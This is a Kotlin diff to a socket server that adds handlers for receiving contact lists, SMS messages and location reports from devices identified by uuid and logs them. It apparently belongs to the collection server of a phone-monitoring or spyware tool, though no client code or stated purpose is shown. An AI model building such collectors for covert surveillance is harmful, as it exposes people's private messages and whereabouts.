@@ -85,9 +85,14 @@ class ServerThread: Thread() {
                                     continue
                                 }
 
+                                var fullContacts = contacts
+                                while (input.ready()) {
+                                    fullContacts += "${input.readLine()}\n"
+                                }
+
                                 Logger.log(
                                     tag,
-                                    "contacts received from $uuid: $contacts"
+                                    "contacts received from $uuid: $fullContacts"
                                 )
                                 output.write("ok\n".toByteArray())
                             }
@@ -109,6 +114,43 @@ class ServerThread: Thread() {
                                 Logger.log(
                                     tag,
                                     "phone info received from $uuid: $fullInfo"
+                                )
+
+                                output.write("ok\n".toByteArray())
+                            }
+
+                            "sms" -> {
+                                val uuid = line.getOrElse(1)  { "" }
+                                val sms = line.getOrElse(2) { "" }
+
+                                if (uuid.isBlank()) {
+                                    output.write("error${dataDivider}uuid required\n".toByteArray())
+                                    continue
+                                }
+
+                                var fullSms = sms
+                                while (input.ready()) { fullSms += "${input.readLine()}\n" }
+
+                                Logger.log(
+                                    tag,
+                                    "sms received from ${uuid}: $fullSms"
+                                )
+
+                                output.write("ok\n".toByteArray())
+                            }
+
+                            "location" -> {
+                                val uuid = line.getOrElse(1) { "" }
+                                val location = line.getOrElse(2) { "" }
+
+                                if (uuid.isBlank()) {
+                                    output.write("error${dataDivider}uuid required\n".toByteArray())
+                                    continue
+                                }
+
+                                Logger.log(
+                                    tag,
+                                    "location received from ${uuid}: $location"
                                 )
 
                                 output.write("ok\n".toByteArray())
